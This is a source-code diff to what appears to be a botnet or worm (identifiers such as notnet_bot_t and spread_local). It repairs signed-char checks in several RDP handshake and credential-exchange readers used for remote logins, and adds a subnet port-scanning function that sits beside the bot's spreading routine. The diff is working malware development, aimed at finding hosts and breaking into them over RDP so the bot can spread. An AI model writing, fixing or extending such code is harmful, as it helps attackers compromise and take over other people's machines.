@@ -914,7 +914,7 @@ static int rdp_read_conn_response(int sock) {
     if (received < 4) return -1;
 
     /* Check for Connection Response marker (C0) */
-    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
 
     return received;
 }
@@ -1001,7 +1001,7 @@ static int rdp_read_security_response(int sock) {
     if (received < 4) return -1;
 
     /* Check for expected response */
-    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
 
     return received;
 }
@@ -1070,7 +1070,7 @@ static int rdp_read_client_info_response(int sock) {
     char buf[256];
     int received = recv(sock, buf, sizeof(buf), 0);
     if (received < 4) return -1;
-    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
     return received;
 }
 
@@ -1119,7 +1119,7 @@ static int rdp_read_key_exchange_response(int sock) {
     char buf[256];
     int received = recv(sock, buf, sizeof(buf), 0);
     if (received < 4) return -1;
-    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
     return received;
 }
 
@@ -1154,7 +1154,7 @@ static int rdp_read_control_sync_response(int sock) {
     char buf[256];
     int received = recv(sock, buf, sizeof(buf), 0);
     if (received < 4) return -1;
-    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
     /* Check for CO_ACK */
     if (received >= 8 && buf[6] != 0x15) return -1;
     return received;
@@ -1190,7 +1190,7 @@ static int rdp_read_persistent_key_list_response(int sock) {
     char buf[256];
     int received = recv(sock, buf, sizeof(buf), 0);
     if (received < 4) return -1;
-    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
     return received;
 }
 
@@ -1225,6 +1225,7 @@ static int rdp_connect(int sock) {
 
 /* RDP send SCKEY/DH key exchange with credentials */
 static int rdp_send_cred_key_exchange(int sock, const char *user, const char *pass) {
+    (void)pass;
     uint8_t pkt[512];
     int pos = 0;
 
@@ -1294,7 +1295,7 @@ static int rdp_read_cred_response(int sock) {
     char buf[256];
     int received = recv(sock, buf, sizeof(buf), 0);
     if (received < 4) return -1;
-    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
     return received;
 }
 
@@ -1327,7 +1328,7 @@ static int rdp_read_final_control_response(int sock) {
     char buf[256];
     int received = recv(sock, buf, sizeof(buf), 0);
     if (received < 4) return -1;
-    if (buf[0] != 0x03 || buf[1] != 0xC0) return -1;
+    if (buf[0] != 0x03 || (unsigned char)buf[1] != 0xC0) return -1;
     return received;
 }
 
@@ -1557,6 +1558,120 @@ int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port) {
     }
     
     return 0;
+}
+
+
+/* Lightweight port scan that only checks if ports are open (no spreading).
+ * Returns a string of "ip:port" for each open port found.
+ * Caller must free(). Returns NULL on error. */
+char *scan_ports(const char *target, uint16_t *ports, int port_count) {
+    /* Parse target: "192.168.1.0/24" or "192.168.1.1:22,23,445" */
+    char ip[16] = {0};
+    int is_subnet = 0;
+    char subnet_buf[16] = {0};
+
+    char *slash = strchr(target, '/');
+    char *colon = strchr(target, ':');
+
+    if (slash) {
+        /* Subnet format: 192.168.1.0/24 */
+        int n = slash - target;
+        if (n > 15) n = 15;
+        memcpy(ip, target, n);
+        ip[n] = '\0';
+        is_subnet = 1;
+        strncpy(subnet_buf, target, 15);
+        subnet_buf[15] = '\0';
+    } else if (colon) {
+        /* Single IP with ports: 192.168.1.1:22,23 */
+        int n = colon - target;
+        if (n > 15) n = 15;
+        memcpy(ip, target, n);
+        ip[n] = '\0';
+    } else {
+        /* Just IP */
+        strncpy(ip, target, 15);
+        ip[15] = '\0';
+    }
+
+    /* Build result string */
+    char *result = (char *)malloc(4096);
+    if (!result) return NULL;
+    result[0] = '\0';
+    int total_open = 0;
+
+    if (is_subnet) {
+        /* Parse subnet */
+        char net[16], mask[4] = {0};
+        if (sscanf(subnet_buf, "%15[^/]/%3s", net, mask) < 2) {
+            free(result);
+            return NULL;
+        }
+        int prefix = atoi(mask);
+        if (prefix < 16 || prefix > 32) {
+            free(result);
+            return NULL;
+        }
+
+        struct in_addr in;
+        if (inet_pton(AF_INET, net, &in) != 1) {
+            free(result);
+            return NULL;
+        }
+
+        uint32_t host_ip = ntohl(in.s_addr);
+        int hosts = (1 << (32 - prefix)) - 2;
+        if (hosts > 254) hosts = 254;
+        if (hosts < 1) hosts = 1;
+
+        for (int i = 1; i <= hosts; i++) {
+            uint32_t cur_ip = host_ip + i;
+            char ip_str[16];
+            snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
+                     (cur_ip >> 24) & 0xFF, (cur_ip >> 16) & 0xFF,
+                     (cur_ip >> 8) & 0xFF, cur_ip & 0xFF);
+
+            for (int p = 0; p < port_count; p++) {
+                int sock = create_connection(ip_str, ports[p], SCAN_TIMEOUT_MS);
+                if (sock >= 0) {
+                    char entry[64];
+                    int elen = snprintf(entry, sizeof(entry), "%s:%d ", ip_str, ports[p]);
+                    if (strlen(result) + elen < 4090) {
+                        strcat(result, entry);
+                        total_open++;
+                    }
+                    close(sock);
+                }
+            }
+        }
+    } else {
+        /* Single IP */
+        for (int p = 0; p < port_count; p++) {
+            int sock = create_connection(ip, ports[p], SCAN_TIMEOUT_MS);
+            if (sock >= 0) {
+                char entry[64];
+                int elen = snprintf(entry, sizeof(entry), "%s:%d ", ip, ports[p]);
+                if (strlen(result) + elen < 4090) {
+                    strcat(result, entry);
+                    total_open++;
+                }
+                close(sock);
+            }
+        }
+    }
+
+    if (total_open == 0) {
+        snprintf(result, 4096, "no open ports found");
+    } else {
+        char header[64];
+        snprintf(header, sizeof(header), "%d open ports: ", total_open);
+        /* Prepend header */
+        int rlen = strlen(result);
+        memmove(result + strlen(header), result, rlen + 1);
+        memcpy(result, header, strlen(header));
+    }
+
+    return result;
 }
 
 int spread_local(notnet_bot_t *bot) {
